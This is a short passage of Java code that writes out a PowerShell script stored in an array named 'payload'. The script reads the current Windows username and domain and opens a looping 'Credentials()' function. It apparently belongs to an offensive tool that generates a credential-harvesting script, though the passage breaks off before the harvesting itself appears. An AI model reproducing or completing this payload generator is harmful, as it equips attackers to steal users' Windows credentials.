		BufferedWriter buffer = new BufferedWriter(write);
		String payload[] = new String[lines];
		payload[0] = "$username = $env:USERNAME";
		payload[1] = "$CurrentDomain_1 = $env:USERDOMAIN";
		payload[2] = "$status = $true";
		payload[3] = "function Credentials()";
		payload[4] = "{";
		payload[5] = "\twhile ($status)";
		payload[6] = "\t{";
